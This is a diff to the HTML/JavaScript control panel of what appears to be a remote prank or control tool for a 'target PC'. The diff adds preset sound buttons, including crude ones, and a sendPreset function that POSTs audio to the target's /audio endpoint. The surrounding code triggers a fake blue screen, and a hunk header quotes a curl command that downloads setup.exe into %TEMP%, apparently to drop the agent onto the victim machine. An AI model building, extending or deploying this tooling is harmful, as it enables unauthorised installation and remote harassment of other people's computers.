@@ -378,20 +378,32 @@
         <div><div class="card-title">Audio</div><div class="card-desc">Joue un son sur le PC cible</div></div>
       </div>
       <div class="field">
-        <label>Fichier audio (MP3, WAV, OGG)</label>
-        <label class="file-label" for="audioFile">
-          📁 Choisir un fichier
-          <input type="file" id="audioFile" accept="audio/*" />
-        </label>
-        <span class="file-name" id="audioName">Aucun fichier</span>
-      </div>
-      <div class="field">
         <label>Volume — <span id="volumeVal">100</span>%</label>
         <input type="range" id="audioVolume" min="0" max="100" value="100"
                oninput="document.getElementById('volumeVal').textContent=this.value"
                style="width:100%;accent-color:var(--accent);cursor:pointer" />
       </div>
-      <button class="btn" onclick="sendAudio()">Envoyer</button>
+      <div class="field">
+        <label>Sons rapides</label>
+        <div style="display:flex;flex-wrap:wrap;gap:.4rem">
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendPreset('Bruit de pet.mp3')">💨 Pet</button>
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendPreset('Hava Nagila Original.mp3')">🎺 Hava Nagila</button>
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendPreset('air-horn-sfx-62-sonido-corneta-de-aire-sonido-dj-efecto-de-sonido-freesounds-1-1.mp3')">📯 Air Horn</button>
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendPreset('crie-de-singe.mp3')">🐒 Singe</button>
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendPreset('je-propose-une-branlette-collective-2_KG4qIlD.mp3')">😂 Branlette</button>
+        </div>
+      </div>
+      <div style="border-top:1px solid var(--border);padding-top:.75rem;display:flex;flex-direction:column;gap:.6rem">
+        <div class="field">
+          <label>Fichier personnalise (MP3, WAV, OGG)</label>
+          <label class="file-label" for="audioFile">
+            📁 Choisir un fichier
+            <input type="file" id="audioFile" accept="audio/*" />
+          </label>
+          <span class="file-name" id="audioName">Aucun fichier</span>
+        </div>
+        <button class="btn" onclick="sendAudio()">Envoyer</button>
+      </div>
     </div>
 
     <div class="card">
@@ -614,6 +626,27 @@ curl.exe -sLo "%TEMP%\\setup.exe" "${SETUP_URL}"
 
   function sendBSOD()  { post('/bsod',       JSON.stringify({})); }
   function closeBSOD() { post('/bsod/close', JSON.stringify({})); }
+
+  async function sendPreset(filename) {
+    const url = getTarget();
+    if (!url) { toast("Entre d'abord l'URL de la cible !", 'err'); return; }
+    const volume = document.getElementById('audioVolume').value;
+    toast('Chargement…');
+    try {
+      const resp = await fetch('./song/' + encodeURIComponent(filename));
+      if (!resp.ok) throw new Error();
+      const blob = await resp.blob();
+      const fd = new FormData();
+      fd.append('audio', blob, filename);
+      fd.append('volume', volume);
+      const r    = await fetch(url + '/audio', { method: 'POST', body: fd });
+      const json = await r.json();
+      if (r.ok) toast('OK !');
+      else toast('Erreur : ' + (json.error || r.status), 'err');
+    } catch {
+      toast('Impossible de joindre la cible.', 'err');
+    }
+  }
 </script>
 </body>
 </html>
